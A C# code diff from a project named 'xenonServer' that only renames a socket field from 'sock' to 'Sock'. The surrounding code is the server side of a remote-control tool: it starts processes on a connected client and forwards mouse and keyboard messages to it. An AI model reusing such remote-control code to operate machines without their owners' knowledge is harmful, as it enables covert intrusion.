@@ -64,7 +64,7 @@ namespace xenonServer.Forms
         }
         public async Task SetQuality(int quality)
         {   
-            await client.SendAsync(client.sock.Concat(new byte[] { 2 }, client.sock.IntToBytes(quality)));
+            await client.SendAsync(client.Sock.Concat(new byte[] { 2 }, client.Sock.IntToBytes(quality)));
         }
         public void TempOnDisconnect(Node node)
         {
@@ -119,7 +119,7 @@ namespace xenonServer.Forms
         private async Task StartProc(string path) 
         {
             if (!playing) return;
-            await client.SendAsync(client.sock.Concat(new byte[] { 5 }, Encoding.UTF8.GetBytes(path)));
+            await client.SendAsync(client.Sock.Concat(new byte[] { 5 }, Encoding.UTF8.GetBytes(path)));
             await client.SendAsync(new byte[] { 5 });
         }
 
@@ -183,7 +183,7 @@ namespace xenonServer.Forms
             if (id != -1)
             {
                 await Utils.Type2returnAsync(SubSubNode);
-                byte[] a = SubSubNode.sock.IntToBytes(id);
+                byte[] a = SubSubNode.Sock.IntToBytes(id);
                 await client.SendAsync(a);
                 byte[] found = await client.ReceiveAsync();
                 if (found == null || found[0] == 0)
@@ -527,9 +527,9 @@ namespace xenonServer.Forms
                     int IlParam = (int)lParam;
                     Task.Run(async () =>
                     {
-                        payload = client.sock.Concat(new byte[] { 3 }, client.sock.IntToBytes(Imsg));
-                        payload = client.sock.Concat(payload, client.sock.IntToBytes(IwParam));
-                        payload = client.sock.Concat(payload, client.sock.IntToBytes(IlParam));
+                        payload = client.Sock.Concat(new byte[] { 3 }, client.Sock.IntToBytes(Imsg));
+                        payload = client.Sock.Concat(payload, client.Sock.IntToBytes(IwParam));
+                        payload = client.Sock.Concat(payload, client.Sock.IntToBytes(IlParam));
                         await client.SendAsync(payload);
                     }).Wait();
                     break;
@@ -583,9 +583,9 @@ namespace xenonServer.Forms
                     IlParam = (int)lParam;
                     Task.Run(async () =>
                     {
-                        payload = client.sock.Concat(new byte[] { 3 }, client.sock.IntToBytes(Imsg));
-                        payload = client.sock.Concat(payload, client.sock.IntToBytes(IwParam));
-                        payload = client.sock.Concat(payload, client.sock.IntToBytes(IlParam));
+                        payload = client.Sock.Concat(new byte[] { 3 }, client.Sock.IntToBytes(Imsg));
+                        payload = client.Sock.Concat(payload, client.Sock.IntToBytes(IwParam));
+                        payload = client.Sock.Concat(payload, client.Sock.IntToBytes(IlParam));
                         await client.SendAsync(payload);
                     }).Wait();
                     break;
